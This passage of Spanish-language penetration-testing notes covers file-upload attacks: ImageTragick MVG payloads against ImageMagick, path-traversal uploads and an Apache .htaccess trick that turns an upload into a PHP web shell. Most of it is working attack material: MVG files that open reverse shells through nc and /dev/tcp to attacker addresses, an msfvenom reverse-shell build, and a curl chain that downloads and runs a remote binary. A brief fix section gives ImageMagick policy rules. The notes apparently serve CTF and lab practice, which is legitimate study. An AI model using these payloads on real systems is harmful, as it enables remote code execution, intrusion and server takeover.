push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/oops.jpg"|touch "/tmp/hacked)'
pop graphic-context
```

Cuando el usuario carga la imagen, se ejecuta el comando (touch /tmp/hacked). Aunque el usuario no verá la salida de los comandos, esto se puede escalar fácilmente a un shell inverso. Echa un vistazo al siguiente ejemplo.

```bash
# reverse.png
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/someimage.jpg"|nc -e /bin/sh IP_ADDRESS_HERE "PORT_HERE)'
pop graphic-context
```

o

```bash
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```

```bash
push graphic-context
viewbox 0 0 640 480
fill 'url(https://\x22|setsid /bin/bash -i >/dev/tcp/xx.xx.248.51/443 0<&1 2>&1")'
pop graphic-context
```

puedes crear un **.elf** malicioso para luego invocarlo:

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.15.41 LPORT=443 -f elf -o shell.elf
```

```bash
push graphic-context 
viewbox 0 0 640 480 
fill 'url(https://127.0.0.0/oops.jpg"|curl 10.10.15.41/shell.elf -o /tmp/shell.elf; chmod +x /tmp/shell.elf; /tmp/shell.elf; echo "rce1)'
pop graphic-context
```

payloads all the things [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Picture%20Image%20Magik](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Picture%20Image%20Magik)

```bash
push graphic-context
encoding "UTF-8"
viewbox 0 0 1 1
affine 1 0 0 1 0 0
push graphic-context
image Over 0,0 1,1 '|/bin/sh -i > /dev/tcp/IP/PORT 0<&1 2>&1'
pop graphic-context
pop graphic-context
```

### COMO ARREGLAR ESTA VULNERABILIDAD

Puede corregir esta vulnerabilidad actualizando ImageMagick a la última versión. El registro de cambios se proporciona [aquí](http://legacy.imagemagick.org/script/changelog.php) . O bien, si no desea actualizar la utilidad, ImageMagick también ha compartido una solución alternativa en una publicación oficial [aquí](https://www.imagemagick.org/discourse-server/viewtopic.php?f=4&t=29588) . Dice que puede editar el `policy.xml` de ImageMagick y agregar las siguientes políticas que evitarán esta vulnerabilidad.

```bash
<policy domain="coder" rights="none" pattern="EPHEMERAL" />
<policy domain="coder" rights="none" pattern="HTTPS" />
<policy domain="coder" rights="none" pattern="MVG" />
<policy domain="coder" rights="none" pattern="MSL" />
```

Después de actualizar su `policy.xml`, puede probar su configuración clonando este [repositorio git](https://github.com/ImageTragick/PoCs) y ejecutando `test.sh`.

```bash
git clone https://github.com/ImageTragick/PoCs.git
cd PoCs
chmod +x test.sh && ./test.sh
```

Si ingresa `SAFE`en la salida, ya no es vulnerable, pero si obtiene `UNSAFE`, debe actualizar su `policy.xml` archivo.

## FILE UPLOAD + LFI

Supongamos que el servidor esta configurado para que no se pueda ejecutar o ver los archivos que se cargan, eso quiere decir que yo tengo un formulario de carga de archivos, cargo mi **shell.php** pero el servidor no me deja ejecutar el archivo al llamarlo desde su ruta.

esto puede ser byppaseado mediante el directory path traversal para crear un archivo en la ruta padre, es decir, si normalmente una imagen se carga en **/files/profiles**, que pasaria si el nombre del archivo es algo como **../exploit.php**, esto se guardaria en **/files/exploit.php** en una carpeta atras.

pasos a seguir:

- interceptar la peticion de la carga.

![[Pasted image 20230209095650.png]]

![[Pasted image 20230209095710.png]]

- modificar el nombre del archivo a ../exploit.php (se puede jugar con mas **../**)

![[Pasted image 20230209095752.png]]

>[!note]
>Para evitar errores vamos a urlencodear el caracter `/ = %2f`

llamamos al archivo cargado y lo interceptamos con burpsuite:

![[Pasted image 20230209100033.png]]

![[Pasted image 20230209100134.png]]

es necesario en la intercepcion realizar un **url decoded** al nombrel del archivo:

![[Pasted image 20230209100248.png]]

![[Pasted image 20230209100316.png]]

## BYPASS BLACKLIST EXTENSION (SERVIDOR APACHE HTTP)

Si enumeramos el servidor web (Web Banner Disclosure) podemos ver si estamos ante un APACHE SERVER. En caso de ser asi y de que se tenga una restriccion de extension en la carga de archivos podemos hacer los siguientes bypass:

### BRUTE FORCE EXTENSION

podemos jugar con el intruder de burp para realizar un bypass de este control y determinar que extensiones son validas para cargar archivos.

### MODIFICAR EL .HTACCESS

**_Vamos a cargar 2 archivos, primero un archivo de configuracion .htaccess y segundo la webshell_**

Los archivos .htaccess proporcionan una forma de realizar cambios de configuración por directorio.

primero interceptamos la peticion de una carga de archivos y modificamos el nombre con **.htaccess**, agregamos el contentType `text/plain` y el contenido con:

```bash
AddType application/x-httpd-php .l33t
```

![[Pasted image 20230209104449.png]]

La configuración anterior indicaría al servidor Apache HTTP que ejecute archivos con extesion **.l33t** como si fueran scripts PHP. Se puede colocar cualquier extension y jugar con ello.

Despues se tiene que cargar la web shell en PHP pero con extension **.l33t** algo como **exploit.l33t**.

![[Pasted image 20230209105043.png]]

Al cargar el archivo se deberia tener una web shell.

![[Pasted image 20230209105151.png]]

aqui un ejemplo interesante con mas configuracion en el .htaccess

- [https://thibaud-robin.fr/articles/bypass-filter-upload/](https://thibaud-robin.fr/articles/bypass-filter-upload/)
- [https://medium.com/@nyomanpradipta120/unrestricted-file-upload-in-php-b4459eef9698](https://medium.com/@nyomanpradipta120/unrestricted-file-upload-in-php-b4459eef9698)


## PRACTICING

rootme - THM